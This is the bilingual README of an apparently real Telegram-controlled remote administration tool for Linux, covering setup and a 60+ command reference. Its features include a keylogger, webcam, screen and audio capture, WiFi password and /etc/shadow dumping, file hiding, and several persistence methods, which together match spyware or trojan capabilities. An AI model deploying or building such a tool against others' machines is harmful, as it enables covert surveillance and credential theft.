# 🤖 linux-telegram-bot


<div align="center">

[![Platform](https://img.shields.io/badge/platform-Linux-blue?logo=linux&logoColor=white)](https://www.linux.org/)
[![Language](https://img.shields.io/badge/language-Python%203-3776AB?logo=python)](https://www.python.org/)
[![License](https://img.shields.io/badge/license-MIT-green)](LICENSE)

*Advanced Telegram-based Remote Administration Tool for Linux*

</div>

---

## ⚠️ Legal Disclaimer

**This software is intended for educational purposes and authorized system administration only.**

- ✅ **Allowed**: Managing your own devices, penetration testing with explicit consent, education
- ❌ **Prohibited**: Unauthorized access, privacy violations, illegal activities

**The author assumes no responsibility for misuse of this software.**

---

## 📖 Table of Contents | Оглавление

- [English](#english)
  - [📋 Overview](#-overview)
  - [✨ Features](#-features)
  - [🚀 Quick Start](#-quick-start)
  - [📁 File Structure](#-file-structure)
  - [🔐 Security](#-security)
  - [📚 Command Reference](#-command-reference)
  - [⚙️ Configuration](#️-configuration)
  - [🛡️ Persistence](#️-persistence)

- [Русский](#русский)
  - [📋 Обзор](#-обзор)
  - [✨ Возможности](#-возможности)
  - [🚀 Быстрый старт](#-быстрый-старт)
  - [📁 Структура файлов](#-структура-файлов)
  - [🔐 Безопасность](#-безопасность)
  - [📚 Справочник команд](#-справочник-команд)
  - [⚙️ Конфигурация](#️-конфигурация)
  - [🛡️ Персистентность](#️-персистентность)

---

# English

## 📋 Overview

**linux-telegram-bot** is a single-file remote administration tool that provides **complete Linux system control** through Telegram. 60+ commands, encrypted storage, self-healing, and multi-threaded architecture.

### What It Can Do

| Category | Capabilities |
|----------|-------------|
| **System** | Reboot, shutdown, sleep, process/service management, kernel modules |
| **Files** | Browse, upload, download, create, delete, hide, zip, chmod |
| **Network** | IP config, routing tables, ARP, netstat, WiFi scan/passwords |
| **UI Control** | Screenshot, webcam, audio record/play, mouse, keyboard, clipboard |
| **Surveillance** | Keylogger (4 modes), clipboard monitor, message display |
| **Persistence** | systemd service, crontab, autostart, environment variables |
| **Security** | User management, app/site blocking, SHADOW dump |

---

## ✨ Features

| Feature | Description |
|---------|-------------|
| 🔐 **Password Protection** | SHA256 hash verification |
| 🔑 **Sessions** | Encrypted files on disk + in-memory cache |
| 📦 **Auto-Install** | Automatically installs all Python dependencies |
| 🔄 **Self-Healing** | Monitors and restores files, service, and recovery copies |
| 🔒 **Encryption** | Custom XOR stream cipher for all sensitive data |
| 🧵 **Multi-Threaded** | 4 worker threads for parallel command processing |
| 📄 **File Transfer** | Upload/download any size via Telegram |
| 🎨 **Formatted Output** | All tables rendered via `tabulate` |

---

## 🚀 Quick Start

### Prerequisites

```bash
sudo apt install python3 python3-pip python3-venv \
    ffmpeg xdotool xmessage libnotify-bin \
    net-tools iproute2 nmcli lshw
```

### Installation

```bash
git clone https://github.com/vk-candpython/linux-telegram-bot.git
cd linux-telegram-bot
```

### Configuration

Edit `bot.py`:

```python
TOKEN = "YOUR_BOT_TOKEN"           # From @BotFather
PASSWORD = "YOUR_PASSWORD_HASH"    # SHA256 of your password
SEED = 12345                       # Encryption key seed
PATH = "/opt/mybot"                # Installation directory
BOT_EXE = True                     # Persistent service mode (optional)
```

### Generate Password Hash

```bash
python3 -c "from hashlib import sha256; print(sha256('PASSWORD'.encode()).hexdigest())"
```

### Run

```bash
sudo python3 bot.py
```

---

## 📁 File Structure

```
/opt/mybot/                          # Installation path
├── bot.py                           # Main script
├── mem/                             # Session files (encrypted)
├── sys/
│   ├── conf/                        # TOKEN, PASSWORD (encrypted)
│   ├── .init                        # Service launcher
│   ├── 0                            # Autostart config (encrypted)
│   └── 1                            # Keylogger flag
├── tmp/                             # Temp files (keylogs, blocked apps)
├── share/                           # Uploaded/downloaded files
└── .venv/                           # Python virtual environment
```

---

## 🔐 Security

### Encryption

Custom XOR stream cipher with feedback mutation. Each encrypted byte depends on the key, position, and previous ciphertext, creating an avalanche effect.

**What is encrypted:** TOKEN, PASSWORD, session files, keylogger data, autostart config, blocked apps list.

### Session Model

| Storage | Contains | Lifetime |
|---------|----------|----------|
| **Disk** (`mem/`) | Encrypted registration date only (anonymous) | Persistent |
| **RAM** (`SESSION`) | @username, session date, send() | Until restart/exit |

Disk files contain no usernames — only encrypted dates. User data exists only in volatile memory.

---

## 📚 Command Reference

### Core Commands

| Command | Description |
|---------|-------------|
| `help` | Show all commands |
| `session` | Session info |
| `getpid` | Current bot PID |
| `getuid` | Current user |
| `setuid (id)` | Switch UID |
| `restart` | Restart bot |
| `exit` | Log out |
| `repeat (cmd) -c (n) -d (sec)` | Repeat command N times |

### File System

| Command | Syntax |
|---------|--------|
| `pwd` | Show current directory |
| `cd (path)` | Change directory |
| `ls [path]` | List files |
| `mkfile (path) -d (data)` | Create file |
| `mkdir (path)` | Create directory |
| `rn (name) -n (new)` | Rename |
| `rm (path)` | Delete file |
| `rmdir (path)` | Delete directory |
| `cp (from) -t (to)` | Copy |
| `mv (from) -t (to)` | Move |
| `chmod (path) -m (mode)` | Change permissions |
| `hide (path)` | Hide file |
| `unhide (path)` | Unhide file |
| `cat (path)` | Download file |
| `zip [path]` | Create ZIP archive |

### Network

| Command | Description |
|---------|-------------|
| `inet -e\|-d` | Enable/disable internet |
| `ipconfig` | IP info + interfaces |
| `route` | Routing tables |
| `arp` | ARP cache |
| `netstat` | Active connections |
| `wifi -g` | Scan WiFi |
| `wifi -p` | Saved WiFi passwords |
| `site -b\|-d (domain)` | Block/unblock site |
| `site -d (url) -n (name)` | Download from URL |

### System

| Command | Description |
|---------|-------------|
| `systeminfo` | Full system report |
| `lshw` | Hardware details |
| `dmesg` | Kernel messages |
| `ps` | Process list |
| `kill (pid\|name)` | Terminate process |
| `run (path) -a (args)` | Launch file |
| `cmd -e\|-g (cmd)` | Execute shell command |
| `modprobe -g\|-i\|-d` | Kernel modules |
| `service -g\|-c\|-d\|-e\|-s...` | Systemd services |
| `crontab -g\|-c\|-d` | Cron tasks |
| `startup -g\|-c\|-d` | User autostart |
| `env -g\|-q\|-c\|-d` | Environment variables |
| `user -g\|-c\|-d` | User management |
| `block -l\|-b\|-d` | App blocking |
| `sleep\|reboot\|shutdown` | Power management |
| `hashpass` | Dump /etc/shadow |

### User Interface

| Command | Description |
|---------|-------------|
| `screen` | Screenshot |
| `webcam` | Webcam capture |
| `audio -m\|-p (sec)` | Record audio |
| `audio -s (path)` | Play audio |
| `mouse -p\|-x\|-c\|-s` | Mouse control |
| `keyboard -t\|-k\|-c\|-b` | Keyboard control |
| `clipboard -g\|-c\|-r` | Clipboard control |
| `msg -p\|-s (title) -t (text)` | Display message |

### Keylogger

| Command | Description |
|---------|-------------|
| `keylogger -e` | Enable |
| `keylogger -d` | Disable |
| `keylogger -s` | Status |
| `keylogger -g (mode)` | Get data |
| `keylogger -r` | Clear data |

**Modes:** `base` (raw), `char` (text only), `hotkey` (tags only), `no hotkey` (clean text)

---

## ⚙️ Configuration

```bash
config -g                        # View config
config TOKEN -s (value)          # Change TOKEN
config PASSWORD -s (value)       # Change PASSWORD (auto-hashed)
config SEED -s (value)           # Change SEED (numeric only)
config -r TOKEN                  # Reset to default

account -g                       # List connected users
account -d (id)                  # Delete user session
```

---

## 🛡️ Persistence

### 1. Systemd Service (BOT_EXE=True)

```bash
service -c mybot -d "My Bot" -p /path/to/bot -a none -u root
```

Auto-maintained by `init_bot_exe()` thread every 3 seconds.

### 2. Internal Autostart

```bash
autostart -c name -p /path/to/file -a "args"
autostart -l                     # List
autostart -d name                # Delete
```

### 3. Crontab

```bash
crontab -c name -e "*/5 * * * *" -u root -p /script -a none
```

### 4. User Autostart (.desktop)

```bash
startup -c name -p /path/to/file -a none
```

### 5. Environment Variables

```bash
env -c MYVAR -v "value"
```

---

# Русский

## 📋 Обзор

**linux-telegram-bot** — одноплатный инструмент удалённого администрирования, предоставляющий **полный контроль над системой Linux** через Telegram. 60+ команд, зашифрованное хранение, самовосстановление, многопоточность.

### Что он умеет

| Категория | Возможности |
|-----------|-------------|
| **Система** | Перезагрузка, сон, управление процессами/службами/модулями ядра |
| **Файлы** | Навигация, загрузка, скачивание, создание, удаление, скрытие, архивация |
| **Сеть** | IP, роутинг, ARP, netstat, WiFi (сканирование/пароли) |
| **UI** | Скриншоты, вебкамера, запись/воспроизведение звука, мышь, клавиатура |
| **Наблюдение** | Кейлоггер (4 режима), буфер обмена |
| **Персистентность** | systemd, crontab, автозагрузка, переменные окружения |
| **Безопасность** | Пользователи, блокировка приложений/сайтов, дамп SHADOW |

---

## ✨ Возможности

| Возможность | Описание |
|-------------|----------|
| 🔐 **Защита паролем** | Проверка SHA256 хеша |
| 🔑 **Сессии** | Зашифрованные файлы на диске + кеш в ОЗУ |
| 📦 **Авто-установка** | Автоматическая установка всех Python-зависимостей |
| 🔄 **Самовосстановление** | Отслеживает и восстанавливает файлы, службу и копии |
| 🔒 **Шифрование** | Собственный XOR-шифр для всех чувствительных данных |
| 🧵 **Многопоточность** | 4 потока для параллельной обработки команд |
| 📄 **Передача файлов** | Загрузка/скачивание любого размера через Telegram |
| 🎨 **Форматирование** | Все таблицы через `tabulate` |

---

## 🚀 Быстрый старт

### Требования

```bash
sudo apt install python3 python3-pip python3-venv \
    ffmpeg xdotool xmessage libnotify-bin \
    net-tools iproute2 nmcli lshw
```

### Установка

```bash
git clone https://github.com/vk-candpython/linux-telegram-bot.git
cd linux-telegram-bot
```

### Конфигурация

Отредактируй `bot.py`:

```python
TOKEN = "ТВОЙ_ТОКЕН"              # От @BotFather
PASSWORD = "ХЕШ_ПАРОЛЯ"           # SHA256 твоего пароля
SEED = 12345                      # Зерно ключа шифрования
PATH = "/opt/mybot"               # Директория установки
BOT_EXE = True                    # Режим службы (опционально)
```

### Генерация хеша пароля

```bash
python3 -c "from hashlib import sha256; print(sha256('ПАРОЛЬ'.encode()).hexdigest())"
```

### Запуск

```bash
sudo python3 bot.py
```

---

## 📁 Структура файлов

```
/opt/mybot/                          # Директория установки
├── bot.py                           # Основной скрипт
├── mem/                             # Файлы сессий (зашифрованы)
├── sys/
│   ├── conf/                        # TOKEN, PASSWORD (зашифрованы)
│   ├── .init                        # Скрипт запуска службы
│   ├── 0                            # Конфиг автозапуска (зашифрован)
│   └── 1                            # Флаг кейлоггера
├── tmp/                             # Временные файлы (кейлоги, блокировки)
├── share/                           # Загруженные/скачанные файлы
└── .venv/                           # Виртуальное окружение Python
```

---

## 🔐 Безопасность

### Шифрование

Собственный XOR-шифр с обратной связью. Каждый зашифрованный байт зависит от ключа, позиции и предыдущего шифротекста.

**Что шифруется:** TOKEN, PASSWORD, файлы сессий, данные кейлоггера, конфиг автозапуска, список блокировок.

### Модель сессий

| Хранилище | Содержит | Время жизни |
|-----------|----------|-------------|
| **Диск** (`mem/`) | Только зашифрованная дата (анонимно) | Постоянно |
| **ОЗУ** (`SESSION`) | @username, дата сессии, send() | До перезапуска/выхода |

Файлы на диске не содержат имён пользователей — только зашифрованные даты. Данные пользователей живут только в оперативной памяти.

---

## 📚 Справочник команд

### Основные команды

| Команда | Описание |
|---------|----------|
| `help` | Показать все команды |
| `session` | Информация о сессии |
| `getpid` | PID бота |
| `getuid` | Текущий пользователь |
| `setuid (id)` | Сменить UID |
| `restart` | Перезапустить бота |
| `exit` | Выйти из сессии |
| `repeat (cmd) -c (n) -d (sec)` | Повторить команду N раз |

### Файловая система

| Команда | Синтаксис |
|---------|-----------|
| `pwd` | Текущая директория |
| `cd (path)` | Сменить директорию |
| `ls [path]` | Список файлов |
| `mkfile (path) -d (data)` | Создать файл |
| `mkdir (path)` | Создать директорию |
| `rn (name) -n (new)` | Переименовать |
| `rm (path)` | Удалить файл |
| `rmdir (path)` | Удалить директорию |
| `cp (from) -t (to)` | Копировать |
| `mv (from) -t (to)` | Переместить |
| `chmod (path) -m (mode)` | Изменить права |
| `hide (path)` | Скрыть файл |
| `unhide (path)` | Раскрыть файл |
| `cat (path)` | Скачать файл |
| `zip [path]` | Создать ZIP-архив |

### Сеть

| Команда | Описание |
|---------|----------|
| `inet -e\|-d` | Включить/выключить интернет |
| `ipconfig` | IP-информация |
| `route` | Таблицы маршрутизации |
| `arp` | ARP-кэш |
| `netstat` | Активные соединения |
| `wifi -g` | Сканировать WiFi |
| `wifi -p` | Пароли WiFi |
| `site -b\|-d (domain)` | Блокировка/разблокировка сайта |
| `site -d (url) -n (name)` | Скачать с URL |

### Система

| Команда | Описание |
|---------|----------|
| `systeminfo` | Полный отчёт о системе |
| `lshw` | Информация об оборудовании |
| `dmesg` | Сообщения ядра |
| `ps` | Список процессов |
| `kill (pid\|name)` | Завершить процесс |
| `run (path) -a (args)` | Запустить файл |
| `cmd -e\|-g (cmd)` | Выполнить команду |
| `modprobe -g\|-i\|-d` | Модули ядра |
| `service -g\|-c\|-d\|-e\|-s...` | Systemd-службы |
| `crontab -g\|-c\|-d` | Задачи cron |
| `startup -g\|-c\|-d` | Автозагрузка |
| `env -g\|-q\|-c\|-d` | Переменные окружения |
| `user -g\|-c\|-d` | Пользователи |
| `block -l\|-b\|-d` | Блокировка приложений |
| `sleep\|reboot\|shutdown` | Управление питанием |
| `hashpass` | Дамп /etc/shadow |

### Интерфейс пользователя

| Команда | Описание |
|---------|----------|
| `screen` | Скриншот |
| `webcam` | Снимок с веб-камеры |
| `audio -m\|-p (sec)` | Запись звука |
| `audio -s (path)` | Воспроизвести аудио |
| `mouse -p\|-x\|-c\|-s` | Управление мышью |
| `keyboard -t\|-k\|-c\|-b` | Управление клавиатурой |
| `clipboard -g\|-c\|-r` | Буфер обмена |
| `msg -p\|-s (title) -t (text)` | Показать сообщение |

### Кейлоггер

| Команда | Описание |
|---------|----------|
| `keylogger -e` | Включить |
| `keylogger -d` | Выключить |
| `keylogger -s` | Статус |
| `keylogger -g (mode)` | Получить данные |
| `keylogger -r` | Очистить данные |

**Режимы:** `base` (сырые), `char` (только текст), `hotkey` (только теги), `no hotkey` (чистый текст)

---

## ⚙️ Конфигурация

```bash
config -g                        # Показать конфигурацию
config TOKEN -s (value)          # Изменить TOKEN
config PASSWORD -s (value)       # Изменить PASSWORD (авто-хеш)
config SEED -s (value)           # Изменить SEED (только цифры)
config -r TOKEN                  # Сбросить до значения по умолчанию

account -g                       # Список подключённых
account -d (id)                  # Удалить сессию
```

---

## 🛡️ Персистентность

### 1. Systemd-служба (BOT_EXE=True)

```bash
service -c mybot -d "My Bot" -p /path/to/bot -a none -u root
```

Автоматически поддерживается потоком `init_bot_exe()` каждые 3 секунды.

### 2. Внутренний автозапуск

```bash
autostart -c name -p /path/to/file -a "args"
autostart -l                      # Список
autostart -d name                 # Удалить
```

### 3. Crontab

```bash
crontab -c name -e "*/5 * * * *" -u root -p /script -a none
```

### 4. Пользовательская автозагрузка (.desktop)

```bash
startup -c name -p /path/to/file -a none
```

### 5. Переменные окружения

```bash
env -c MYVAR -v "value"
```

---

<div align="center">

*Full Linux Control via Telegram*

</div>
